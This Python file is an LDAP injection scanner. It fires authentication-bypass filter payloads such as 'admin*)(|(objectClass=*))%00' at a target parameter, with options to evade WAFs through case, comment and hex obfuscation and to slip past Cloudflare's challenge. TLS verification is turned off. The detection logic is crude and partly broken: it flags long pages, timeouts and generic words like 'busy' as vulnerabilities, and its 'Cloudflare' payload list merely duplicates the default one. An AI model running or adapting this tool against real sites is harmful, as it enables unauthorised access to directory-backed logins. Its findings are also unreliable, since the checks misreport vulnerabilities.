import requests
import urllib.parse
import time
import random
import re
from bs4 import BeautifulSoup

class LDAPInjectionScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "CF_BYPASS": False,
            "WAF_BYPASS": False,
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "COMMENT_BYPASS": False,
            "HEX_ENCODE": False,
            "URL_ENCODE": True
        }
        
        self.payloads = [
            "*",
            "*)%00",
            "*)",
            "*))%00",
            "admin*))%00",
            "admin*)(|(objectClass=*))%00",
            "admin*)(|(objectClass=user))%00",
            "admin*)(|(objectClass=person))%00",
            "admin*)(|(objectClass=*))",
            "admin*)(|(objectClass=user))",
            "admin*)(|(objectClass=person))",
            "*)(|(objectClass=*))%00",
            "*)(|(objectClass=user))%00",
            "*)(|(objectClass=person))%00",
            "*)(|(objectClass=*))",
            "*)(|(objectClass=user))",
            "*)(|(objectClass=person))",
            "*)%00",
            "*)",
            "*))%00",
            "admin*))%00",
            "admin*)(|(objectClass=*))%00",
            "admin*)(|(objectClass=user))%00",
            "admin*)(|(objectClass=person))%00"
        ]
        
        self.error_patterns = [
            "ldap_search",
            "ldap_bind",
            "ldap_connect",
            "LDAP error",
            "ldap_errno",
            "ldap_error",
            "LDAPException",
            "javax.naming",
            "NamingException",
            "ldap_err2str",
            "ldap_get_entries",
            "syntax error",
            "Protocol error",
            "Operations error",
            "Stronger auth required",
            " referral",
            "admin limit exceeded",
            "Unavailable critical extension",
            "Confidentiality required",
            "SASL bind in progress",
            "no such attribute",
            "undefined type",
            "inappropriate matching",
            "constraint violation",
            "attributeOrValueExists",
            "invalidAttributeSyntax",
            "noSuchObject",
            "aliasProblem",
            "invalidDNSyntax",
            "isLeaf",
            "aliasDereferencingProblem",
            "inappropriateAuthentication",
            "invalidCredentials",
            "insufficientAccessRights",
            "busy",
            "unavailable",
            "unwillingToPerform",
            "loopDetect",
            "namingViolation",
            "objectClassViolation",
            "notAllowedOnNonLeaf",
            "notAllowedOnRDN",
            "entryAlreadyExists",
            "affectsMultipleDSAs",
            "other"
        ]
        
        self.waf_bypass_payloads = [
            "*",
            "*)%00",
            "*)",
            "*))%00",
            "aDmIn*))%00",
            "aDmIn*)(|(oBjEcTcLaSs=*))%00",
            "aDmIn*)(|(oBjEcTcLaSs=uSeR))%00",
            "aDmIn*)(|(oBjEcTcLaSs=pErSoN))%00",
            "aDmIn*)(|(oBjEcTcLaSs=*))",
            "aDmIn*)(|(oBjEcTcLaSs=uSeR))",
            "aDmIn*)(|(oBjEcTcLaSs=pErSoN))",
            "*)(|(oBjEcTcLaSs=*))%00",
            "*)(|(oBjEcTcLaSs=uSeR))%00",
            "*)(|(oBjEcTcLaSs=pErSoN))%00",
            "*)(|(oBjEcTcLaSs=*))",
            "*)(|(oBjEcTcLaSs=uSeR))",
            "*)(|(oBjEcTcLaSs=pErSoN))",
            "*)%00",
            "*)",
            "*))%00",
            "aDmIn*))%00",
            "aDmIn*)(|(oBjEcTcLaSs=*))%00",
            "aDmIn*)(|(oBjEcTcLaSs=uSeR))%00",
            "aDmIn*)(|(oBjEcTcLaSs=pErSoN))%00"
        ]
        
        self.cf_bypass_payloads = [
            "*",
            "*)%00",
            "*)",
            "*))%00",
            "admin*))%00",
            "admin*)(|(objectClass=*))%00",
            "admin*)(|(objectClass=user))%00",
            "admin*)(|(objectClass=person))%00",
            "admin*)(|(objectClass=*))",
            "admin*)(|(objectClass=user))",
            "admin*)(|(objectClass=person))",
            "*)(|(objectClass=*))%00",
            "*)(|(objectClass=user))%00",
            "*)(|(objectClass=person))%00",
            "*)(|(objectClass=*))",
            "*)(|(objectClass=user))",
            "*)(|(objectClass=person))",
            "*)%00",
            "*)",
            "*))%00",
            "admin*))%00",
            "admin*)(|(objectClass=*))%00",
            "admin*)(|(objectClass=user))%00",
            "admin*)(|(objectClass=person))%00"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("COMMENT_BYPASS"):
            payload = self.comment_bypass(payload)
        
        if self.get_option("HEX_ENCODE"):
            payload = self.hex_encode(payload)
        
        if self.get_option("URL_ENCODE"):
            payload = urllib.parse.quote(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def random_space(self, payload):
        result = []
        for c in payload:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '/**/', '%20', '+']))
        return ''.join(result)
    
    def comment_bypass(self, payload):
        return payload.replace(' ', '/**/')
    
    def hex_encode(self, payload):
        return '0x' + payload.encode('utf-8').hex()
    
    def get_cloudflare_cookies(self, url):
        try:
            session = requests.Session()
            response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
            
            if 'cf_clearance' in response.cookies:
                return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            soup = BeautifulSoup(response.text, 'html.parser')
            js_challenge = soup.find('script', string=re.compile('setTimeout'))
            
            if js_challenge:
                time.sleep(5)
                response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
                if 'cf_clearance' in response.cookies:
                    return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            return None
        except:
            return None
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        cookies = {}
        
        if self.get_option("CF_BYPASS"):
            cf_cookies = self.get_cloudflare_cookies(url)
            if cf_cookies:
                cookies.update(cf_cookies)
        
        vulnerabilities = []
        
        payloads_to_test = self.payloads
        
        if self.get_option("WAF_BYPASS"):
            payloads_to_test = self.waf_bypass_payloads
        
        if self.get_option("CF_BYPASS"):
            payloads_to_test = self.cf_bypass_payloads
        
        for i, payload in enumerate(payloads_to_test, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable, vuln_type = self.test_payload(url, param, processed_payload, method, timeout, headers, cookies)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            for pattern in self.error_patterns:
                if pattern.lower() in response.text.lower():
                    return True, "Error-based LDAPi"
            
            if "ldap" in response.text.lower() and "error" in response.text.lower():
                return True, "Error-based LDAPi"
            
            if len(response.text) > 10000:
                return True, "LDAPi (suspected)"
            
        except requests.exceptions.Timeout:
            return True, "Time-based LDAPi (suspected)"
        except Exception:
            pass
        
        return False, None
